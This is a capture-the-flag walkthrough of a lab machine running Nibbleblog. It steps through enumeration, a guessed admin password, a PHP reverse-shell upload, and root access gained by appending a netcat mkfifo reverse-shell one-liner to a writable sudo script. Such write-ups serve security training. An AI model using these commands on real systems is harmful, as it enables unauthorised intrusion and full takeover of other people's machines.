## Initial Reconnaissance

A port scan was run to identify the exposed services. It shows SSH and HTTP open, so the web application is opened in a browser.

## Web Enumeration

The page source contains a comment that points to a directory tied to Nibbleblog. That path is then enumerated for content.

```bash
dirb http://10.10.10.75/nibbleblog/
```

Enumeration uncovers a login page and a README file, and the README discloses the exact Nibbleblog version running on the server.

![Nibbleblog README and version](/assets/images/nibbles/36-1.png)
*The README reveals the Nibbleblog version*

## Vulnerability Identification

**searchsploit** shows that this version of Nibbleblog is vulnerable to **CVE-2015-6967**.

![Searchsploit results](/assets/images/nibbles/36-2.png)
*searchsploit results for the disclosed version*

One of the configuration files reveals a user named **admin**. After a few attempts, the blog name itself works as the password and grants access to the admin dashboard; that value is the one referenced in **config.xml**.

## File Upload & Reverse Shell

From the dashboard, a malicious PHP file is uploaded to obtain a reverse shell, using the well-known Pentestmonkey PHP shell. Once uploaded, the payload is triggered by browsing to its path.

```bash
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/
```

![Reverse shell obtained](/assets/images/nibbles/36-3.png)
*Reverse shell from the uploaded plugin*

## Privilege Escalation

From the initial shell, `sudo -l` shows that a specific **.sh** script can be run as root.

![sudo -l output](/assets/images/nibbles/36-4.png)
*sudo allows running a script as root*

Because that script is writable, a reverse-shell payload is appended to it, so executing it through sudo runs the payload as root.

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f' | tee -a monitor.sh
```

Running the script with sudo returns a root reverse shell.

![Root shell](/assets/images/nibbles/36-5.png)
*Root shell obtained through the sudo-able script*
